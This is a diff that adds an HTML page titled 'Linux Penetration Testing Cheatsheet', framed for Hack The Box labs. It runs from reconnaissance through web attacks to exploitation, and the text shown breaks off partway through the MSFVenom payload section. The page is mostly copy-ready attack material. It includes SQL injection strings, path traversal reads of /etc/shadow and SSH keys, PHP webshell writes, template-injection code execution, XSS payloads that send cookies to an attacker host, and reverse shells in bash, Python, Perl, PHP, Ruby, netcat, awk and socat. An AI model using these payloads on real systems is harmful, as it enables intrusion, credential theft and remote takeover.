@@ -1,0 +1,1126 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <script src="../assets/components.js"></script>
+  <style>
+    /* ── MD Cheatsheet Styles ── */
+    .md-h1 { font-family:var(--mono); font-size:22px; font-weight:700; color:var(--text); margin:0 0 6px; }
+    .md-h3 { font-family:var(--mono); font-size:13px; font-weight:600; color:var(--accent); margin:24px 0 10px; letter-spacing:.03em; }
+    .md-h4 { font-family:var(--mono); font-size:12px; font-weight:500; color:var(--orange); margin:18px 0 8px; }
+    .md-p  { font-family:var(--mono); font-size:12px; color:var(--muted); line-height:1.8; margin:10px 0; }
+    .md-hr { border:none; border-top:1px solid var(--border); margin:32px 0; }
+    .md-ul, .md-ol { font-family:var(--mono); font-size:12px; color:var(--muted); line-height:1.8; padding-left:20px; margin:8px 0; }
+    .md-ul li, .md-ol li { margin:2px 0; }
+    .md-ol a, .md-ul a { color:#c4d4d4; text-decoration:none; }
+    .md-ol a:hover, .md-ul a:hover { text-decoration:underline; }
+    .md-blockquote { border-left:3px solid var(--green); padding:8px 14px; background:rgba(57,211,83,.05); font-family:var(--mono); font-size:12px; color:var(--muted); margin:10px 0; border-radius:0 6px 6px 0; }
+    .inline-code { background:var(--surface2); color:var(--accent); padding:1px 6px; border-radius:4px; font-family:var(--mono); font-size:11px; border:1px solid var(--border); }
+    .md-table-wrap { overflow-x:auto; margin:14px 0; }
+    .md-table { width:100%; border-collapse:collapse; font-family:var(--mono); font-size:11px; }
+    .md-table th { background:var(--surface); color:var(--text); padding:8px 12px; border:1px solid var(--border); text-align:left; }
+    .md-table td { color:var(--muted); padding:7px 12px; border:1px solid var(--border); }
+    .md-table tr:hover td { background:var(--bg3); color:var(--text); }
+    .cm { color:#3d4450; font-style:italic; }
+    .page-header { margin-bottom:32px; padding-bottom:16px; border-bottom:1px solid var(--border); }
+    .page-header-sub { font-family:var(--mono); font-size:11px; color:var(--muted); margin-top:6px; }
+  </style>
+</head>
+<body>
+<div class="page-content">
+
+  <div class="page-header">
+    <h1 class="md-h1">Linux Penetration Testing Cheatsheet</h1>
+    <div class="page-header-sub">by J0stif &nbsp;·&nbsp; Full Methodology: Recon → Root</div>
+  </div>
+
+<hr class="md-hr">
+<div class="sec-hdr" id="table-of-contents" style="margin-top:36px"><span class="sec-title">📋 TABLE OF CONTENTS</span><span class="sec-line"></span></div>
+<ol class="md-ol"><li><a href="#environment-setup">Environment Setup</a></li><li><a href="#phase-1--reconnaissance--enumeration">Phase 1 — Reconnaissance & Enumeration</a></li><li><a href="#phase-2--service-enumeration-deep-dive">Phase 2 — Service Enumeration Deep Dive</a></li><li><a href="#phase-3--web-application-attacks">Phase 3 — Web Application Attacks</a></li><li><a href="#phase-4--exploitation--initial-access">Phase 4 — Exploitation & Initial Access</a></li><li><a href="#phase-5--post-exploitation--stabilization">Phase 5 — Post-Exploitation & Stabilization</a></li><li><a href="#phase-6--linux-privilege-escalation">Phase 6 — Linux Privilege Escalation</a></li><li><a href="#phase-7--persistence--loot">Phase 7 — Persistence & Loot</a></li><li><a href="#wordlists--resources">Wordlists & Resources</a></li><li><a href="#one-liners--tricks">One-Liners & Tricks</a></li></ol>
+<hr class="md-hr">
+<div class="sec-hdr" id="environment-setup" style="margin-top:36px"><span class="sec-title">🛠️ Environment Setup</span><span class="sec-line"></span></div>
+<div class="terminal"><div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn" onclick="copyTerm(this)">copy</button></div><div class="term-body"><span class="cm"># Set target IP once — use $IP everywhere</span>
+export IP=10.10.11.XXX
+export LHOST=10.10.14.XXX   <span class="cm"># your HTB tun0 IP</span>
+export LPORT=4444
+
+<span class="cm"># Confirm your interface</span>
+ip a show tun0
+
+<span class="cm"># Create working directory</span>
+mkdir -p ~/htb/machinename/{nmap,web,loot,exploits}
+cd ~/htb/machinename</div></div>
+<hr class="md-hr">
+<div class="sec-hdr" id="phase-1-reconnaissance-enumeration" style="margin-top:36px"><span class="sec-title">Phase 1 — Reconnaissance & Enumeration</span><span class="sec-line"></span></div>
+<h3 class="md-h3" id="11-nmap-initial-scans">1.1 Nmap — Initial Scans</h3>
+<div class="terminal"><div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn" onclick="copyTerm(this)">copy</button></div><div class="term-body"><span class="cm"># Fast full TCP port scan (find open ports first)</span>
+nmap -p- --min-rate=5000 -T4 $IP -oN nmap/all_ports.txt
+
+<span class="cm"># Targeted service/version/script scan on found ports</span>
+nmap -p 22,80,443 -sC -sV -O $IP -oN nmap/targeted.txt
+
+<span class="cm"># UDP top 100 (don't skip this!)</span>
+nmap -sU --top-ports 100 $IP -oN nmap/udp.txt
+
+<span class="cm"># Vulnerability scan (use carefully, can be noisy)</span>
+nmap --script vuln $IP -oN nmap/vuln.txt
+
+<span class="cm"># SMB-specific enumeration</span>
+nmap --script smb-enum-shares,smb-enum-users,smb-vuln* -p 445 $IP
+
+<span class="cm"># NSE scripts by category</span>
+nmap --script "default or safe" $IP
+nmap --script "http-*" -p 80,8080,443 $IP</div></div>
+<h3 class="md-h3" id="12-autorecon-full-automation">1.2 AutoRecon (Full Automation)</h3>
+<div class="terminal"><div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn" onclick="copyTerm(this)">copy</button></div><div class="term-body"><span class="cm"># Install</span>
+pip3 install git+https://github.com/Tib3rius/AutoRecon.git
+
+<span class="cm"># Run</span>
+autorecon $IP -o autorecon/</div></div>
+<hr class="md-hr">
+<div class="sec-hdr" id="phase-2-service-enumeration-deep-dive" style="margin-top:36px"><span class="sec-title">Phase 2 — Service Enumeration Deep Dive</span><span class="sec-line"></span></div>
+<h3 class="md-h3" id="21-ftp-port-21">2.1 FTP (Port 21)</h3>
+<div class="terminal"><div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn" onclick="copyTerm(this)">copy</button></div><div class="term-body"><span class="cm"># Anonymous login</span>
+ftp $IP
+<span class="cm"># user: anonymous | pass: (blank or email)</span>
+
+<span class="cm"># Banner grab</span>
+nc -nv $IP 21
+
+<span class="cm"># Nmap scripts</span>
+nmap --script ftp-anon,ftp-brute -p 21 $IP
+
+<span class="cm"># Recursive download</span>
+wget -m ftp://anonymous:anonymous@$IP/</div></div>
+<h3 class="md-h3" id="22-ssh-port-22">2.2 SSH (Port 22)</h3>
+<div class="terminal"><div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn" onclick="copyTerm(this)">copy</button></div><div class="term-body"><span class="cm"># Banner / version</span>
+ssh -v $IP
+
+<span class="cm"># Try common creds</span>
+ssh admin@$IP
+ssh root@$IP
+
+<span class="cm"># Audit SSH config</span>
+nmap --script ssh-auth-methods -p 22 $IP
+nmap --script ssh-hostkey -p 22 $IP
+
+<span class="cm"># Connect with key</span>
+ssh -i id_rsa user@$IP
+chmod 600 id_rsa  <span class="cm"># required!</span>
+
+<span class="cm"># Port forwarding via SSH</span>
+ssh -L 8080:127.0.0.1:8080 user@$IP  <span class="cm"># local forward</span>
+ssh -R 9090:127.0.0.1:9090 user@$IP  <span class="cm"># remote forward</span>
+ssh -D 1080 user@$IP                  <span class="cm"># SOCKS5 proxy</span></div></div>
+<h3 class="md-h3" id="23-smtp-port-25">2.3 SMTP (Port 25)</h3>
+<div class="terminal"><div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn" onclick="copyTerm(this)">copy</button></div><div class="term-body"><span class="cm"># User enumeration via VRFY/EXPN</span>
+smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t $IP
+smtp-user-enum -M EXPN -U users.txt -t $IP
+
+<span class="cm"># Manual</span>
+nc -nv $IP 25
+VRFY root
+EXPN root
+
+<span class="cm"># Nmap scripts</span>
+nmap --script smtp-enum-users,smtp-vuln* -p 25 $IP</div></div>
+<h3 class="md-h3" id="24-dns-port-53">2.4 DNS (Port 53)</h3>
+<div class="terminal"><div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn" onclick="copyTerm(this)">copy</button></div><div class="term-body"><span class="cm"># Zone transfer attempt</span>
+dig axfr @$IP domain.htb
+host -l domain.htb $IP
+
+<span class="cm"># Reverse lookup</span>
+dig -x $IP @$IP
+
+<span class="cm"># Subdomain brute force</span>
+gobuster dns -d domain.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -t 50
+ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://domain.htb -H "Host: FUZZ.domain.htb" -fs 0
+
+<span class="cm"># DNSRecon</span>
+dnsrecon -d domain.htb -t axfr
+dnsrecon -d domain.htb -t brt -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt</div></div>
+<h3 class="md-h3" id="25-smb-port-445">2.5 SMB (Port 445)</h3>
+<div class="terminal"><div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn" onclick="copyTerm(this)">copy</button></div><div class="term-body"><span class="cm"># Null session enum</span>
+smbclient -L //$IP -N
+smbclient //$IP/share -N
+
+<span class="cm"># CrackMapExec</span>
+crackmapexec smb $IP
+crackmapexec smb $IP -u '' -p '' --shares
+crackmapexec smb $IP -u 'guest' -p '' --shares
+
+<span class="cm"># Enum4linux-ng (comprehensive)</span>
+enum4linux-ng -A $IP
+
+<span class="cm"># smbmap</span>
+smbmap -H $IP
+smbmap -H $IP -u '' -p ''
+smbmap -H $IP -u 'user' -p 'pass' -R  <span class="cm"># recursive</span>
+
+<span class="cm"># Download all files from a share</span>
+smbget -R smb://$IP/share -U guest
+
+<span class="cm"># Mount share</span>
+mount -t cifs //$IP/share /mnt/smb -o username=guest,password=
+
+<span class="cm"># Nmap scripts</span>
+nmap --script smb-enum-shares,smb-enum-users,smb-os-discovery -p 445 $IP</div></div>
+<h3 class="md-h3" id="26-snmp-port-161-udp">2.6 SNMP (Port 161 UDP)</h3>
+<div class="terminal"><div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn" onclick="copyTerm(this)">copy</button></div><div class="term-body"><span class="cm"># Walk community strings</span>
+snmpwalk -v2c -c public $IP
+snmpwalk -v2c -c private $IP
+snmpwalk -v1 -c public $IP
+
+<span class="cm"># Brute force community string</span>
+onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt $IP
+
+<span class="cm"># Enumerate specific OIDs</span>
+snmpwalk -v2c -c public $IP 1.3.6.1.4.1.77.1.2.25  <span class="cm"># users</span>
+snmpwalk -v2c -c public $IP 1.3.6.1.2.1.25.4.2.1.2  <span class="cm"># processes</span>
+snmpwalk -v2c -c public $IP 1.3.6.1.2.1.6.13.1.3    <span class="cm"># open ports</span></div></div>
+<h3 class="md-h3" id="27-nfs-port-2049">2.7 NFS (Port 2049)</h3>
+<div class="terminal"><div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn" onclick="copyTerm(this)">copy</button></div><div class="term-body"><span class="cm"># Show available mounts</span>
+showmount -e $IP
+nmap -sV --script nfs-showmount $IP
+
+<span class="cm"># Mount NFS share</span>
+mount -t nfs $IP:/share /mnt/nfs
+mount -t nfs -o vers=3 $IP:/share /mnt/nfs
+
+<span class="cm"># Check permissions</span>
+ls -la /mnt/nfs</div></div>
+<h3 class="md-h3" id="28-ldap-port-389636">2.8 LDAP (Port 389/636)</h3>
+<div class="terminal"><div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn" onclick="copyTerm(this)">copy</button></div><div class="term-body"><span class="cm"># Anonymous bind</span>
+ldapsearch -x -H ldap://$IP -b "dc=domain,dc=htb"
+ldapsearch -x -H ldap://$IP -b "" -s base namingContexts
+
+<span class="cm"># Dump all objects</span>
+ldapsearch -x -H ldap://$IP -b "dc=domain,dc=htb" "(objectClass=*)"
+
+<span class="cm"># Enum users</span>
+ldapsearch -x -H ldap://$IP -b "dc=domain,dc=htb" "(objectClass=user)" sAMAccountName
+
+<span class="cm"># With creds</span>
+ldapsearch -x -H ldap://$IP -D "cn=admin,dc=domain,dc=htb" -w 'password' -b "dc=domain,dc=htb"</div></div>
+<h3 class="md-h3" id="29-redis-port-6379">2.9 Redis (Port 6379)</h3>
+<div class="terminal"><div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn" onclick="copyTerm(this)">copy</button></div><div class="term-body">redis-cli -h $IP
+redis-cli -h $IP ping
+redis-cli -h $IP info
+redis-cli -h $IP keys '*'
+redis-cli -h $IP get key_name
+
+<span class="cm"># Auth</span>
+redis-cli -h $IP auth password</div></div>
+<h3 class="md-h3" id="210-mysql-port-3306">2.10 MySQL (Port 3306)</h3>
+<div class="terminal"><div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn" onclick="copyTerm(this)">copy</button></div><div class="term-body">mysql -h $IP -u root -p
+mysql -h $IP -u root --password=''
+
+<span class="cm"># Commands inside MySQL</span>
+SHOW DATABASES;
+USE db_name;
+SHOW TABLES;
+SELECT * FROM table_name;
+SELECT user,password FROM mysql.user;
+
+<span class="cm"># Read files (if FILE priv)</span>
+SELECT LOAD_FILE('/etc/passwd');
+
+<span class="cm"># Write files (if writeable)</span>
+SELECT "&lt;?php system($_GET['cmd']); ?&gt;" INTO OUTFILE '/var/www/html/shell.php';</div></div>
+<h3 class="md-h3" id="211-postgresql-port-5432">2.11 PostgreSQL (Port 5432)</h3>
+<div class="terminal"><div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn" onclick="copyTerm(this)">copy</button></div><div class="term-body">psql -h $IP -U postgres
+psql -h $IP -U postgres -d database_name
+
+<span class="cm"># Commands</span>
+\list          -- list databases
+\c dbname      -- connect to db
+\dt            -- list tables
+SELECT * FROM table;
+\q             -- quit
+
+<span class="cm"># RCE via COPY TO/FROM</span>
+COPY cmd_exec FROM PROGRAM 'id';
+SELECT * FROM cmd_exec;</div></div>
+<hr class="md-hr">
+<div class="sec-hdr" id="phase-3-web-application-attacks" style="margin-top:36px"><span class="sec-title">Phase 3 — Web Application Attacks</span><span class="sec-line"></span></div>
+<h3 class="md-h3" id="31-directory-file-fuzzing">3.1 Directory & File Fuzzing</h3>
+<div class="terminal"><div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn" onclick="copyTerm(this)">copy</button></div><div class="term-body"><span class="cm"># Gobuster</span>
+gobuster dir -u http://$IP -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -t 50 -x php,txt,html,bak -o web/gobuster.txt
+gobuster dir -u http://$IP -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
+
+<span class="cm"># Ffuf (faster, more flexible)</span>
+ffuf -u http://$IP/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -t 100
+ffuf -u http://$IP/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -mc 200,301,302,403
+ffuf -u http://$IP/FUZZ -w wordlist.txt -fs 0  <span class="cm"># filter by size</span>
+ffuf -u http://$IP/FUZZ -w wordlist.txt -fc 404 <span class="cm"># filter 404s</span>
+
+<span class="cm"># Feroxbuster (recursive by default)</span>
+feroxbuster -u http://$IP -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,html,txt -t 100
+
+<span class="cm"># Vhost / subdomain fuzzing</span>
+ffuf -u http://$IP -H "Host: FUZZ.domain.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txthen -fs [baseline_size]
+gobuster vhost -u http://domain.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt --append-domain</div></div>
+<h3 class="md-h3" id="32-parameter-fuzzing">3.2 Parameter Fuzzing</h3>
+<div class="terminal"><div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn" onclick="copyTerm(this)">copy</button></div><div class="term-body"><span class="cm"># GET param fuzzing</span>
+ffuf -u "http://$IP/page.php?FUZZ=value" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt
+ffuf -u "http://$IP/page.php?id=FUZZ" -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -fs 0
+
+<span class="cm"># POST param fuzzing</span>
+ffuf -u "http://$IP/login" -X POST -d "FUZZ=value" -w params.txt
+ffuf -u "http://$IP/login" -X POST -d "username=FUZZ&amp;password=test" -w users.txt
+
+<span class="cm"># Header fuzzing</span>
+ffuf -u "http://$IP/" -H "X-Forwarded-For: FUZZ" -w ips.txt</div></div>
+<h3 class="md-h3" id="33-sql-injection">3.3 SQL Injection</h3>
+<div class="terminal"><div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn" onclick="copyTerm(this)">copy</button></div><div class="term-body"><span class="cm"># Manual detection</span>
+' OR '1'='1
+' OR '1'='1'--
+' OR 1=1--
+" OR 1=1--
+') OR ('1'='1
+admin'--
+
+<span class="cm"># SQLMap — basic</span>
+sqlmap -u "http://$IP/page?id=1" --dbs
+sqlmap -u "http://$IP/page?id=1" -D dbname --tables
+sqlmap -u "http://$IP/page?id=1" -D dbname -T users --dump
+
+<span class="cm"># SQLMap — POST</span>
+sqlmap -u "http://$IP/login" --data="username=admin&amp;password=test" --dbs
+
+<span class="cm"># SQLMap — with cookies</span>
+sqlmap -u "http://$IP/page" --cookie="PHPSESSID=abc123" --dbs
+
+<span class="cm"># SQLMap — file read/write</span>
+sqlmap -u "http://$IP/page?id=1" --file-read=/etc/passwd
+sqlmap -u "http://$IP/page?id=1" --file-write=shell.php --file-dest=/var/www/html/shell.php
+
+<span class="cm"># SQLMap — OS shell</span>
+sqlmap -u "http://$IP/page?id=1" --os-shell
+
+<span class="cm"># Blind SQLi detection</span>
+' AND SLEEP(5)--
+' AND 1=2--</div></div>
+<h3 class="md-h3" id="34-lfi-path-traversal">3.4 LFI / Path Traversal</h3>
+<div class="terminal"><div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn" onclick="copyTerm(this)">copy</button></div><div class="term-body"><span class="cm"># Basic payloads</span>
+/etc/passwd
+../../../etc/passwd
+....//....//....//etc/passwd
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
+..%252f..%252f..%252fetc/passwd
+
+<span class="cm"># LFI with null byte (PHP &lt; 5.5)</span>
+/etc/passwd%00
+
+<span class="cm"># PHP wrappers</span>
+php://filter/convert.base64-encode/resource=index.php
+php://filter/read=convert.base64-encode/resource=config.php
+php://input (POST body as PHP code)
+data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=
+
+<span class="cm"># Log poisoning → LFI → RCE</span>
+<span class="cm"># Poison via User-Agent or SSH</span>
+curl -s http://$IP/index.php -A "&lt;?php system(\$_GET['cmd']); ?&gt;"
+<span class="cm"># Then: http://$IP/index.php?page=/var/log/apache2/access.log&amp;cmd=id</span>
+
+<span class="cm"># Common files to read</span>
+/etc/passwd
+/etc/shadow
+/etc/hosts
+/etc/hostname
+/proc/self/environ
+/proc/self/cmdline
+/var/log/apache2/access.log
+/var/log/auth.log
+/home/user/.ssh/id_rsa
+/root/.ssh/id_rsa
+/var/www/html/config.php</div></div>
+<h3 class="md-h3" id="35-file-upload-bypass">3.5 File Upload Bypass</h3>
+<div class="terminal"><div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn" onclick="copyTerm(this)">copy</button></div><div class="term-body"><span class="cm"># MIME type bypass</span>
+Content-Type: image/jpeg (but send PHP)
+
+<span class="cm"># Extension bypass</span>
+shell.php.jpg
+shell.php5
+shell.php7
+shell.phtml
+shell.pHp
+shell.PhP
+
+<span class="cm"># Magic bytes trick (prepend GIF header)</span>
+GIF89a; &lt;?php system($_GET['cmd']); ?&gt;
+
+<span class="cm"># Double extension</span>
+shell.jpg.php
+
+<span class="cm"># Null byte (old servers)</span>
+shell.php%00.jpg</div></div>
+<h3 class="md-h3" id="36-ssrf">3.6 SSRF</h3>
+<div class="terminal"><div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn" onclick="copyTerm(this)">copy</button></div><div class="term-body"><span class="cm"># Basic SSRF test</span>
+http://127.0.0.1/
+http://localhost/
+http://169.254.169.254/  <span class="cm"># AWS metadata</span>
+
+<span class="cm"># Port scan via SSRF</span>
+http://127.0.0.1:22/
+http://127.0.0.1:3306/
+http://127.0.0.1:6379/
+
+<span class="cm"># Read files via SSRF</span>
+file:///etc/passwd
+dict://127.0.0.1:6379/info
+
+<span class="cm"># Cloud metadata</span>
+http://169.254.169.254/latest/meta-data/  <span class="cm"># AWS</span>
+http://metadata.google.internal/          <span class="cm"># GCP</span></div></div>
+<h3 class="md-h3" id="37-command-injection">3.7 Command Injection</h3>
+<div class="terminal"><div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn" onclick="copyTerm(this)">copy</button></div><div class="term-body"><span class="cm"># Basic detection</span>
+; id
+| id
+&amp;&amp; id
+`id`
+$(id)
+; id <span class="cm">#</span>
+
+<span class="cm"># Common bypasses</span>
+;id%0a
+%3Bid
+${IFS}id
+{id}
+
+<span class="cm"># Blind detection (DNS/time based)</span>
+; ping -c 1 $LHOST
+; curl http://$LHOST/
+; sleep 5</div></div>
+<h3 class="md-h3" id="38-ssti-server-side-template-injection">3.8 SSTI (Server-Side Template Injection)</h3>
+<div class="terminal"><div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn" onclick="copyTerm(this)">copy</button></div><div class="term-body"><span class="cm"># Detection payloads</span>
+{{7*7}}          → 49 (Jinja2, Twig)
+${7*7}           → 49 (FreeMarker)
+&lt;%= 7*7 %&gt;       → 49 (ERB)
+<span class="cm">#{7*7}           → 49 (Ruby)</span>
+*{7*7}           → 49 (Spring)
+
+<span class="cm"># Jinja2 RCE</span>
+{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}
+
+<span class="cm"># Twig RCE</span>
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}</div></div>
+<h3 class="md-h3" id="39-xss-cookie-stealing">3.9 XSS / Cookie Stealing</h3>
+<div class="terminal"><div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn" onclick="copyTerm(this)">copy</button></div><div class="term-body"><span class="cm"># Reflected XSS</span>
+&lt;script&gt;alert(1)&lt;/script&gt;
+&lt;img src=x onerror=alert(1)&gt;
+"&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+
+<span class="cm"># Cookie theft (serve collector with python)</span>
+python3 -m http.server 80
+&lt;script&gt;new Image().src='http://$LHOST/?c='+document.cookie&lt;/script&gt;
+
+<span class="cm"># XSS to session hijack</span>
+&lt;script&gt;fetch('http://$LHOST/?c='+btoa(document.cookie))&lt;/script&gt;</div></div>
+<h3 class="md-h3" id="310-xxe">3.10 XXE</h3>
+<div class="terminal"><div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn" onclick="copyTerm(this)">copy</button></div><div class="term-body"><span class="cm"># Basic XXE</span>
+&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;
+&lt;root&gt;&lt;data&gt;&amp;xxe;&lt;/data&gt;&lt;/root&gt;
+
+<span class="cm"># XXE via PHP</span>
+&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"&gt;]&gt;
+
+<span class="cm"># Blind XXE (OOB)</span>
+&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "http://$LHOST/?data=test"&gt;]&gt;</div></div>
+<hr class="md-hr">
+<div class="sec-hdr" id="phase-4-exploitation-initial-access" style="margin-top:36px"><span class="sec-title">Phase 4 — Exploitation & Initial Access</span><span class="sec-line"></span></div>
+<h3 class="md-h3" id="41-reverse-shells">4.1 Reverse Shells</h3>
+<div class="terminal"><div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn" onclick="copyTerm(this)">copy</button></div><div class="term-body"><span class="cm"># Bash</span>
+bash -c 'bash -i &gt;&amp; /dev/tcp/$LHOST/$LPORT 0&gt;&amp;1'
+bash -i &gt;&amp; /dev/tcp/$LHOST/$LPORT 0&gt;&amp;1
+
+<span class="cm"># Bash (URL encoded, for web)</span>
+bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F$LHOST%2F$LPORT%200%3E%261%27
+
+<span class="cm"># Python3</span>
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$LHOST",$LPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
+
+<span class="cm"># Python2</span>
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$LHOST",$LPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
+
+<span class="cm"># Perl</span>
+perl -e 'use Socket;$i="$LHOST";$p=$LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/bash -i");};'
+
+<span class="cm"># PHP</span>
+php -r '$sock=fsockopen("$LHOST",$LPORT);exec("/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'
+
+<span class="cm"># Ruby</span>
+ruby -rsocket -e'f=TCPSocket.open("$LHOST",$LPORT).to_i;exec sprintf("/bin/bash -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)'
+
+<span class="cm"># Netcat (GNU)</span>
+nc -e /bin/bash $LHOST $LPORT
+
+<span class="cm"># Netcat (OpenBSD - no -e)</span>
+rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2&gt;&amp;1 | nc $LHOST $LPORT &gt; /tmp/f
+
+<span class="cm"># AWK</span>
+awk 'BEGIN {s = "/inet/tcp/0/$LHOST/$LPORT"; while(42) { do{ printf "shell&gt;" |&amp; s; s |&amp; getline c; if(c){ while ((c |&amp; getline) &gt; 0) print $0 |&amp; s; close(c); } } while(c != "exit") close(s); }}' /dev/null
+
+<span class="cm"># Socat (encrypted)</span>
+socat FILE:`tty`,raw,echo=0 TCP:$LHOST:$LPORT  <span class="cm"># on attacker</span>
+socat TCP:$LHOST:$LPORT EXEC:/bin/bash          <span class="cm"># on target</span></div></div>
+<h3 class="md-h3" id="42-listeners">4.2 Listeners</h3>
+<div class="terminal"><div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn" onclick="copyTerm(this)">copy</button></div><div class="term-body"><span class="cm"># Netcat</span>
+nc -lvnp $LPORT
+
+<span class="cm"># Rlwrap (arrow keys + history)</span>
+rlwrap nc -lvnp $LPORT
+
+<span class="cm"># Socat (fully interactive)</span>
+socat TCP-LISTEN:$LPORT,reuseaddr FILE:`tty`,raw,echo=0
+
+<span class="cm"># Metasploit multi/handler</span>
+msfconsole -q
+use exploit/multi/handler
+set PAYLOAD linux/x64/shell_reverse_tcp
+set LHOST $LHOST
+set LPORT $LPORT
+run</div></div>
+<h3 class="md-h3" id="43-msfvenom-payloads">4.3 MSFVenom Payloads</h3>
+<div class="terminal"><div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn" onclick="copyTerm(this)">copy</button></div><div class="term-body"><span class="cm"># Linux ELF</span>
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf -o shell.elf
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf -o meter.elf
+
+<span class="cm"># PHP</span>
